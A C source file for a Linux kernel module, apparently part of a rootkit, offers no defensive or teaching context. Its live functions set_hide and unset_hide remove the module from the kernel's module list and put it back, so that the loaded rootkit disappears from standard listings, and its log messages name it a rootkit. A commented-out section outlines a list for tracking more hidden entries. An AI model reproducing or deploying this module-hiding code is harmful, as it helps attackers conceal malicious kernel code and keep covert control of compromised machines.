#include <linux/module.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include "hide.h"

static int hidden = 0;
static struct list_head *prev_module;


struct hidden_list {
    void *entry;
    struct hidden_list *next;
};

struct hidden_list *hidden_list_head = NULL;

int set_hide(void){
    if (hidden){
        printk(KERN_INFO "Rootkit already hidden\n");
        return -1;
    }
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
    printk(KERN_INFO "Rootkit: module hidden\n");
    return 0;
}

int unset_hide(void){
    if (!hidden){
        printk(KERN_INFO "Rootkit is already visible\n");
        return -1;
    }
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
    printk(KERN_INFO "Rootkit: module visible\n");
    return 0;
}



/*
int add_entry(void *entry){
    struct hidden_list *new_entry = kmalloc(sizeof(struct hidden_list), GFP_KERNEL);
    if (!new_entry){
        printk(KERN_ERR "Failed to allocate memory\n");
        return -1;
    }
    new_entry->entry = entry;
    new_entry->next = hidden_list_head;
    hidden_list_head = new_entry;
    return 0;
}

int remove_entry(void *entry){
    struct hidden_list *current = hidden_list_head;
    struct hidden_list *previous = NULL;

    while (current != NULL) {
        if (current->entry == entry) {
            if (previous == NULL) {
                hidden_list_head = current->next;
            } else {
                previous->next = current->next;
            }
            kfree(current);
            return 0;
        }
        previous = current;
        current = current->next;
    }
    printk(KERN_ERR "Entry not found\n");
    return -1;
}

void init_hidden_list(void){
    // List is NULL initialized, nothing complex needed yet
}

void cleanup_hidden_list(void){
    struct hidden_list *current = hidden_list_head;
    struct hidden_list *next;

    while (current != NULL) {
        next = current->next;
        kfree(current);
        current = next;
    }
}
*/
